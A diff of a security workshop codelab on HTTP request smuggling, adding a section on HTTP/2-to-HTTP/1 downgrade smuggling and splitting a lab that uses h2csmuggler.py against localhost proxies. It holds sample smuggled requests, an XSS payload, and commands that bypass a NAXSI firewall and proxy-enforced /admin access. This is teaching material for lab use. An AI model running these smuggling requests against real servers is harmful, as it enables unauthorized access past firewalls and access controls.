@@ -220,12 +220,84 @@ Transfer-Encoding: chunked
 GET /contact.php?test=123&#34;&gt;&lt;img/src=&#34;xx&#34;onerror=&#34;alert(1)&#34;&gt; HTTP/1.1
 Foo:
 </code></pre>
-<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request. You should see the XSS trigger.</p>
+<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request. You should see the XSS trigger. </p>
 
 
       </google-codelab-step>
     
-      <google-codelab-step label="WebSocket HRS" duration="0">
+      <google-codelab-step label="HTTP/2 HRS" duration="5">
+        <h2 is-upgraded>HTTP/2 to HTTP/1</h2>
+<p>Few proxies supports the downgrade from HTTP/2 to HTTP/1. This can simplify deployment. Microservices don&#39;t have to be configure with TLS certificates. HTTP/2 and HTTP/1 are very different protocol. HTTP/2 is a binary protocol while HTTP/1 is a text based protocol. In HTTP/1, all exchanges (request and response) need to be sequential.</p>
+<p>In order to proxy requests from one protocol to another, the request need to be rewritten.</p>
+<p>HTTP/2 has two key frames: the headers frame and the data frame. Some common headers are called pseudo headers. They have some <a href="https://httpwg.org/specs/rfc7541.html" target="_blank">additional optimization when encoded with HPACK</a>.</p>
+<p><strong>HTTP/2 Message</strong></p>
+<p>Original H2 message:</p>
+<table>
+<tr><td colspan="2" rowspan="1"></td><td colspan="1" rowspan="1"></td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>POST</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>/api/postMessage</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>service.company.com</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>content-type</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>application/x-www-form-urlencoded</code></p>
+</td></tr>
+<tr><td colspan="2" rowspan="1"><p><code>author=hackfest&message=Hello</code></p>
+</td><td colspan="1" rowspan="1"></td></tr>
+</table>
+<p><strong>HTTP/1 Message</strong></p>
+<p>Converted H1 message:</p>
+<pre><code>POST /api/postMessage HTTP/1.1
+Host: service.company.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+author=hackfest&amp;message=Hello
+</code></pre>
+<h2 is-upgraded>Potential Request Smuggling</h2>
+<p>You might have notice that HTTP/2 doesn&#39;t have a header that describe the length of the data (<code>author=...</code>). The binary format of HTTP/2 has built-in length for every field (header name, header value, data frame, etc).</p>
+<p>However, an attacker could inject header in a HTTP/2 frame with the intention to confuse the final request built.</p>
+<p>For example, here is a malicious HTTP/2 message converted to HTTP/1.</p>
+<p><strong>HTTP/2 Message</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
+</td><td colspan="1" rowspan="1"><p>`POST`</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
+</td><td colspan="1" rowspan="1"><p>`/api/postMessage`</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
+</td><td colspan="1" rowspan="1"><p>`service.company.com`</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>content-type</strong></p>
+</td><td colspan="1" rowspan="1"><p>`application/x-www-form-urlencoded`</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>content-length</strong></p>
+</td><td colspan="1" rowspan="1"><p>`0`</p>
+</td></tr>
+<tr><td colspan="2" rowspan="1"><p><code><br>test=XGET /private/debug HTTP/1.1<br>Host: 127.0.0.1<br><br></code></p>
+</td></tr>
+</table>
+<p><strong>HTTP/1 Message</strong></p>
+<pre><code>POST /api/postMessage HTTP/2
+Host: service.company.com
+Content-Length: 6
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+test=XGET /private/debug HTTP/1.1
+Host: 127.0.0.1:80
+
+
+</code></pre>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="WebSocket HRS" duration="5">
         <h2 is-upgraded>Web Socket in a nutshell</h2>
 <p>WebSocket communication is full-duplex communication that takes place inside a HTTP/1. While typical HTTP/1 messages can be sent in full-duplex, classic HTTP require all messages to have a headers and body section. WebSocket allows lightweight communication along with the control over the Socket with Javascript.</p>
 <p class="image-container"><img alt="h2c sequence diagram" src="img\\831e0a0bd13d2ca8.png"></p>
@@ -310,7 +382,7 @@ c07
 
       </google-codelab-step>
     
-      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext" duration="25">
+      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext (part 1)" duration="10">
         <h2 is-upgraded>Scenario 1: Bypassing WAF</h2>
 <p>Visit <code>http://localhost:8443/movie?id=1</code>. If you attempt to tamper with the parameter <code>id</code>, you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder <em>(see impossible)</em> when a strong firewall is in place. By default, NAXSI is configured to block all quotes <code>'</code> characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.</p>
 <h2 is-upgraded>Validation</h2>
@@ -338,7 +410,12 @@ c07
 [INFO] Requesting - /movie?id=1&#39;
 [...]
 </code></pre>
-<h2 is-upgraded>Scenario 2: Acessing forbidden /admin page</h2>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext (part 2)" duration="10">
+        <h2 is-upgraded>Scenario 2: Accessing forbidden /admin page</h2>
 <p>The same infrastructure to test proxy-level access bypass. The application has an administrative page that is intended only for system administrators. The control is enforced by the proxy. Therefore, if one request is not interpreted by the proxy, the access control will not be enforced.</p>
 <pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 http://127.0.0.1/admin&#39;
 [INFO] h2c stream established successfully.
@@ -350,7 +427,7 @@ c07
 <aside class="special"><p>Don&#39;t forget that the second URL use the port exposed by the web application on the <em>internal network</em>. It might not be 80. You can try port such as <code>5000</code>, <code>8000</code> and <code>8080</code>. Since the tunnel is established with the backend server, the host and port might be ignored on the remote application.</p>
 </aside>
 <h2 is-upgraded>Additional testing possible</h2>
-<p>This lab allows you to exploit the same vulnerability on 3 proxies. These are</p>
+<p>This lab allows you to exploit the same vulnerability on 3 proxies. These are HAProxy, nginx (without NAXSI) and Nuster.</p>
 <table>
 <tr><td colspan="1" rowspan="1"><p>TCP port</p>
 </td><td colspan="1" rowspan="1"><p>Description</p>
@@ -365,7 +442,7 @@ c07
 </td><td colspan="1" rowspan="1"><p>Nuster -&gt; HAProxy -&gt; h2c backend (Insecure configuration with multiple layers of proxies)</p>
 </td></tr>
 </table>
-<p>Changing the port to 8002 and 8003 can confirm that these two others servers are also vulnerable.</p>
+<p>Changing the port to 8001, 8002 and 8003 can confirm that these two others servers are also vulnerable.</p>
 <pre><code>&gt;python h2csmuggler.py -x https://127.0.0.1:8001 -t
 [INFO] h2c stream established successfully.
 [INFO] Success! https://127.0.0.1:8001 can be used for tunneling
